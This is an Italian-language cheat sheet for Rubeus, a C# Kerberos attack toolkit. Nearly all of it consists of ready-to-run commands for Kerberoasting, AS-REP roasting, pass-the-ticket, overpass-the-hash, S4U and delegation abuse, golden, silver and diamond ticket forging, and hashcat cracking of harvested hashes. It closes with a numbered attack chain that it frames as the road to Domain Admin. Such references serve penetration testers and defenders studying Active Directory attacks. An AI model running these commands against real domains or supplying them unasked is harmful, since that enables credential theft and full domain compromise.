# 🎫 Rubeus - Toolkit per l'interazione e gli attacchi Kerberos

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██████╗ ██╗   ██╗██████╗ ███████╗██╗   ██╗███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔════╝██║   ██║██╔════╝
  ██████╔╝██║   ██║██████╔╝█████╗  ██║   ██║███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║
  ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝███████║
  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
           Interazione e abusi Kerberos
```

<p align="center">
  <img src="https://img.shields.io/badge/Rubeus-Kerberos-red?style=for-the-badge" alt="Rubeus">
  <img src="https://img.shields.io/badge/Active_Directory-blue?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/C%23-green?style=for-the-badge" alt="C#">
</p>

> **Nota sulle versioni e sui prerequisiti:** caricamento di un assembly e sua esecuzione sono operazioni distinte: `LoadFile` da solo non invoca il programma. `0x3e7` identifica la sessione SYSTEM, non tutte le sessioni di accesso. Privilegi, tipi di chiave, policy Kerberos, deleghe e aggiornamenti determinano l’applicabilità degli esempi; nomi delle opzioni e sintassi dei ticket possono dipendere dalla release. Una cifratura AES non garantisce discrezione e i ticket contraffatti non implicano automaticamente diritti DCSync. I comandi originali restano invariati: consulta il [progetto ufficiale Rubeus](https://github.com/GhostPack/Rubeus).

---

## 📋 Indice

- [Che cos'è Rubeus](#-che-cosè-rubeus)
- [Operazioni sui ticket](#-operazioni-sui-ticket)
- [Kerberoasting](#-kerberoasting)
- [AS-REP Roasting](#-as-rep-roasting)
- [Attacchi ai ticket](#-attacchi-ai-ticket)
- [Attacchi alla delega](#-attacchi-alla-delega)
- [Golden e Silver Ticket](#-golden-e-silver-ticket)
- [Riferimento rapido](#-riferimento-rapido)

---

## 🎯 Che cos'è Rubeus

**Rubeus** è un toolkit C# per interagire con Kerberos e verificarne possibili abusi:

- 🎫 **Operazioni sui ticket** - Richiedi, rinnova e descrivi i ticket
- 🔓 **Kerberoasting** - Estrai hash associati ai ticket di servizio
- 🔑 **AS-REP roasting** - Attacchi agli utenti senza preautenticazione
- 🎭 **Pass-the-Ticket** - Riutilizzo dei ticket acquisiti
- ✨ **Golden/Silver Ticket** - Creazione di ticket contraffatti

---

## 🚀 Utilizzo di base

### Esecuzione di Rubeus

```powershell
# Esecuzione diretta
.\Rubeus.exe <command> [options]

# Esegui in memoria (Cobalt Strike)
execute-assembly Rubeus.exe <command>

# Carica tramite PowerShell
[System.Reflection.Assembly]::LoadFile("C:\path\Rubeus.exe")
```

---

## 🎟 Operazioni sui ticket

### Richiedi un TGT

```powershell
# Con password
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /domain:domain.local

# Con hash NTLM
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:domain.local

# Con chiave AES256
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:domain.local

# Con certificato
.\Rubeus.exe asktgt /user:admin /certificate:cert.pfx /password:pfxpass

# Salva l'output in un file
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /outfile:ticket.kirbi
```

### Richiedi un TGS

```powershell
# Richiedi un ticket di servizio
.\Rubeus.exe asktgs /ticket:base64ticket /service:cifs/server.domain.local

# Con TGT da file
.\Rubeus.exe asktgs /ticket:ticket.kirbi /service:http/server.domain.local
```

### Elenca i ticket

```powershell
# Elenca i ticket dell'utente corrente
.\Rubeus.exe triage

# Elenca tutti i ticket (richiede amministratore; vedi nota sul LUID)
.\Rubeus.exe triage /luid:0x3e7

# Estrazione dettagliata dei ticket
.\Rubeus.exe dump
```

### Pass-the-Ticket

```powershell
# Importa il ticket nella sessione corrente
.\Rubeus.exe ptt /ticket:base64ticket

# Importa da file
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Crea una nuova sessione di accesso e importa
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x123456
```

### Descrivi il ticket

```powershell
# Mostra i dettagli del ticket
.\Rubeus.exe describe /ticket:base64ticket

# Da file
.\Rubeus.exe describe /ticket:ticket.kirbi
```

---

## 🍖 Kerberoasting

### Kerberoasting di base

```powershell
# Kerberoasting di tutti gli SPN
.\Rubeus.exe kerberoast

# Salva in un file (formato hashcat)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Seleziona un utente specifico
.\Rubeus.exe kerberoast /user:sqlservice

# Downgrade a RC4 (etype 23)
.\Rubeus.exe kerberoast /rc4opsec
```

### Kerberoasting avanzato

```powershell
# Con un TGT specifico
.\Rubeus.exe kerberoast /ticket:base64tgt

# Solo statistiche (senza ticket)
.\Rubeus.exe kerberoast /stats

# Seleziona uno SPN specifico
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.local

# Cifratura AES (meno evidente secondo l'originale)
.\Rubeus.exe kerberoast /aes

# Filtra per utente
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

### Recupero delle password dagli hash Kerberoast

```bash
# Hashcat (modalità 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# John
john --wordlist=rockyou.txt kerberoast.txt
```

---

## 🔓 AS-REP Roasting

### AS-REP roasting di base

```powershell
# Trova gli utenti senza preautenticazione ed esegui AS-REP Roasting
.\Rubeus.exe asreproast

# Salva l'output in un file
.\Rubeus.exe asreproast /outfile:asrep.txt

# Seleziona un utente specifico
.\Rubeus.exe asreproast /user:targetuser

# Formato hashcat
.\Rubeus.exe asreproast /format:hashcat
```

### Recupero delle password dagli hash AS-REP

```bash
# Hashcat (modalità 18200)
hashcat -m 18200 asrep.txt wordlist.txt
```

---

## 🎭 Attacchi ai ticket

### Overpass-the-Hash (Pass-the-Key)

```powershell
# Ottieni un TGT con hash e crea una nuova sessione
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Con chiave AES
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /ptt

# Crea un processo dedicato alla nuova sessione
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt /luid:0x123456
```

### S4U (Service for User)

```powershell
# S4U2Self - Impersona un utente verso il servizio stesso
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target.domain.local

# S4U2Proxy - Impersona verso un altro servizio
.\Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:admin /msdsspn:cifs/dc.domain.local /altservice:ldap

# Catena completa
.\Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## 🔀 Attacchi alla delega

### Delega senza vincoli (Unconstrained Delegation)

```powershell
# Monitora i TGT sull'host con delega senza vincoli
.\Rubeus.exe monitor /interval:5 /nowrap

# Filtro specifico
.\Rubeus.exe monitor /targetuser:DC$ /interval:5

# Raccogli i TGT
.\Rubeus.exe harvest /interval:30
```

### Delega vincolata (Constrained Delegation)

```powershell
# Richiedi un ticket per il servizio consentito
.\Rubeus.exe s4u /user:svcaccount /rc4:HASH /impersonateuser:administrator /msdsspn:time/dc.domain.local /altservice:cifs /ptt
```

### Delega vincolata basata sulla risorsa (RBCD)

```powershell
# Dopo aver configurato RBCD con PowerMad/PowerView
# Richiedi un ticket come account macchina dell'attaccante
.\Rubeus.exe s4u /user:attackermachine$ /rc4:MACHINEACCOUNTHASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## ✨ Golden e Silver Ticket

### Golden Ticket

```powershell
# Crea un Golden Ticket (richiede l'hash di krbtgt)
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGTHASH /ptt

# Specifica i gruppi
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /groups:512,513,519 /ptt

# Con chiave AES
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /aes256:AESKEY /ptt
```

### Silver Ticket

```powershell
# Crea un Silver Ticket (richiede l'hash dell'account di servizio)
.\Rubeus.exe silver /service:cifs/target.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:SERVICEHASH /ptt

# Servizio LDAP (DCSync)
.\Rubeus.exe silver /service:ldap/dc.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:DCHASH /ptt
```

### Diamond Ticket

```powershell
# TGT legittimo modificato
.\Rubeus.exe diamond /user:admin /password:P@ssw0rd /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

---

## 📊 Riferimento rapido

### Comandi essenziali

| Comando | Descrizione |
|---------|-------------|
| `asktgt` | Richiedi un TGT |
| `asktgs` | Richiedi un TGS |
| `kerberoast` | Estrai gli hash dei ticket di servizio |
| `asreproast` | AS-REP roasting |
| `ptt` | Pass-the-Ticket |
| `s4u` | Service for User |
| `golden` | Crea un Golden Ticket contraffatto |
| `silver` | Crea un Silver Ticket contraffatto |
| `dump` | Estrai tutti i ticket |
| `triage` | Elenca i ticket |

### Opzioni di autenticazione

| Opzione | Descrizione |
|--------|-------------|
| `/user:` | Nome utente |
| `/password:` | Password |
| `/rc4:` | Hash NTLM |
| `/aes256:` | Chiave AES256 |
| `/ticket:` | Ticket Base64 |

### Opzioni comuni

| Opzione | Descrizione |
|--------|-------------|
| `/ptt` | Pass-the-Ticket |
| `/outfile:` | Salva l'output in un file |
| `/nowrap` | Non mandare a capo Base64 |
| `/domain:` | Dominio bersaglio |
| `/dc:` | Controller di dominio |

### Procedura di attacco

```powershell
# 1. Esegui il Kerberoasting
.\Rubeus.exe kerberoast /outfile:kerb.txt

# 2. Recupera le password dagli hash
hashcat -m 13100 kerb.txt rockyou.txt

# 3. Ottieni un TGT con la password recuperata
.\Rubeus.exe asktgt /user:svc /password:CrackedPass /ptt

# 4. Oppure usa Overpass-the-Hash
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt

# 5. Accedi alle risorse
dir \\server\share
```

---

## 📚 Risorse

- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [HarmJ0y Blog](https://blog.harmj0y.net/)
- [SpecterOps](https://specterops.io/)

### Schede correlate
- [BloodHound](../../BloodHound/translations/README.it.md)
- [Impacket](../../Impacket/translations/README.it.md)
- [Mimikatz](../../Mimikatz/translations/README.it.md)

---

<p align="center">
  <b>🎫 Padroneggia Kerberos!</b><br>
  <i>Rubeus - Il biglietto per Domain Admin</i>
</p>
